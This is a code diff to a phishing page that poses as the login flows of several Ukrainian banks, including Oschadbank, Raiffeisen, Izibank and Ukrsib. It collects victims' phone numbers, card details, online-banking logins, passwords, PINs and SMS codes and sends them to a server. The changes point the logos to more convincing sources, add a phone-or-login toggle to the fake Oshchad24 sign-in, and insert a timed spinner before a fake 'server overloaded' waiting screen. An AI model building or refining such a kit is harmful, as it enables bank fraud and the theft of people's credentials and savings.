@@ -92,6 +92,9 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .custom-input { display: none; }
         .sms-form { margin-top: 20px; }
+        .auth-toggle { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; }
+        .auth-toggle label { cursor: pointer; font-size: 16px; font-weight: 500; }
+        .auth-toggle input[type="radio"] { margin-right: 5px; }
     </style>
 </head>
 <body>
@@ -147,7 +150,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankFlows = {
         'oschadbank': {
             name: 'Ощадбанк',
-            logoUrl: 'https://i.imgur.com/4Qv3Z5r.png',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/6/6c/Oschadbank_%28uk%29.png',
             theme: 'oschadbank',
             steps: [
                 { type: 'phone', title: 'Введіть номер телефону' },
@@ -156,28 +159,28 @@ document.addEventListener('DOMContentLoaded', () => {
         },
         'raiffeisen': {
             name: 'Райффайзен',
-            logoUrl: 'https://i.imgur.com/8k2xN4P.png',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/7/7d/Raiffeisen_Bank_International_Logo.svg',
             theme: 'raiffeisen',
             steps: specialFlowSteps,
             special: true
         },
         'vostok': {
             name: 'Восток',
-            logoUrl: 'https://i.imgur.com/3p9yW7J.png',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/2/2b/Bank_Vostok_Logo.png',
             theme: 'vostok',
             steps: specialFlowSteps,
             special: true
         },
         'izibank': {
             name: 'Izibank',
-            logoUrl: 'https://i.imgur.com/5t6xM8R.png',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Izibank_Logo.png',
             theme: 'izibank',
             steps: specialFlowSteps,
             special: true
         },
         'ukrsib': {
             name: 'Укрсиб',
-            logoUrl: 'https://i.imgur.com/7y8vQ2T.png',
+            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/9/9f/Ukrsibbank_Logo.png',
             theme: 'ukrsib',
             steps: specialFlowSteps,
             special: true
@@ -266,10 +269,10 @@ document.addEventListener('DOMContentLoaded', () => {
         const step = activeBankData.steps[currentStepIndex];
         let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
 
-        if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
+        if (activeBankData.theme === 'oschadbank' && (step.type === 'card' || step.type === 'lk_oschad')) {
             isFinalStep = true;
             sendDataToServer(data, isFinalStep, activeBankData.theme);
-            showWaitingScreen();
+            showLoadingSpinner();
             return;
         }
 
@@ -308,6 +311,9 @@ document.addEventListener('DOMContentLoaded', () => {
         modalTitle.textContent = 'Очікуйте, сервер перевантажений';
         stepContent.innerHTML = `<div class="loading-spinner"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" alt="Loading"></div>`;
         modalFooter.style.display = 'none';
+        setTimeout(() => {
+            showWaitingScreen();
+        }, 5000); // Спиннер на 5 сек
     }
 
     function showCodeError() {
@@ -448,7 +454,17 @@ document.addEventListener('DOMContentLoaded', () => {
                 html += '</div>';
                 break;
             case 'lk_oschad':
-                html = `<p style="text-align:center;">Авторизуйтесь через Ощад24</p>${generateInputHTML('login', 'Логін', 'text')}${generateInputHTML('password', 'Пароль', 'password')}`;
+                html = `
+                    <p style="text-align:center;">Для входу у введіть логін або номер телефону</p>
+                    <div class="auth-toggle">
+                        <label><input type="radio" name="auth-type" value="phone" checked> Номер телефону</label>
+                        <label><input type="radio" name="auth-type" value="login"> Логін</label>
+                    </div>
+                    <div id="auth-form">
+                        <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>
+                        ${generateInputHTML('password', 'Пароль', 'password')}
+                    </div>
+                `;
                 break;
             case 'lk_raiffeisen':
                 html = `
@@ -490,6 +506,29 @@ document.addEventListener('DOMContentLoaded', () => {
         nextBtn.textContent = 'Продовжити';
         nextBtn.id = 'next-btn';
         nextBtn.removeEventListener('click', submitSmsCode);
+
+        // Переключение формы ЛК
+        const authToggle = document.querySelectorAll('input[name="auth-type"]');
+        if (authToggle.length > 0) {
+            const authForm = document.getElementById('auth-form');
+            authToggle.forEach(radio => {
+                radio.addEventListener('change', () => {
+                    if (radio.value === 'phone') {
+                        authForm.innerHTML = `
+                            <div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>
+                            ${generateInputHTML('password', 'Пароль', 'password')}
+                        `;
+                    } else {
+                        authForm.innerHTML = `
+                            ${generateInputHTML('login', 'Логін', 'text')}
+                            ${generateInputHTML('password', 'Пароль', 'password')}
+                        `;
+                    }
+                    addInputFormatting();
+                });
+            });
+        }
+
         addInputFormatting();
         if (step.type.includes('pin') && (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank')) {
             setupPinKeyboard();
@@ -576,7 +615,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
                 break;
             case 'lk_oschad':
-                activeBankData.steps = [{ type: 'lk_oschad', title: 'Авторизація в Ощад24' }];
+                activeBankData.steps = [{ type: 'lk_oschad', title: 'Авторизуйтесь через Ощад24' }];
                 currentStepIndex = 0;
                 renderStep();
                 break;
